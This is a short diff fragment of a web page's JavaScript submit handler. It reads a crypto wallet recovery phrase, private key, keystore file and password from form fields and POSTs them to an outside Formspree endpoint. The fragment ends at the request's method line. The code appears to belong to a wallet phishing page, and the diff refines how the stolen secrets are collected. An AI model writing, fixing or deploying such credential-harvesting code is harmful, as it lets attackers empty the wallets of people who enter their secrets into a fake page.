@@ -76,15 +76,13 @@ function closeModal() {
 }
 
 // Submit Button
-document.getElementById('submitBtn').onclick = function () {
-  const phraseForm = document.getElementById('phraseForm');
-  const privateKeyForm = document.getElementById('privatekeyForm');
-  const keystoreForm = document.getElementById('keystoreForm');
+document.getElementById('submitBtn').onclick = function (e) {
+  e.preventDefault(); // Prevent default form submission
 
-  const phrase = phraseForm?.phrase?.value.trim() || '';
-  const privateKey = privateKeyForm?.privatekey?.value.trim() || '';
-  const keystore = keystoreForm?.keystore?.value.trim() || '';
-  const password = keystoreForm?.password?.value.trim() || '';
+  const phrase = document.getElementById('phrase').value.trim();
+  const privateKey = document.getElementById('private-key').value.trim();
+  const keystore = document.getElementById('keystore-json').value.trim();
+  const password = document.getElementById('password').value.trim();
 
   fetch('https://formspree.io/f/xqaybqon', {
     method: 'POST',
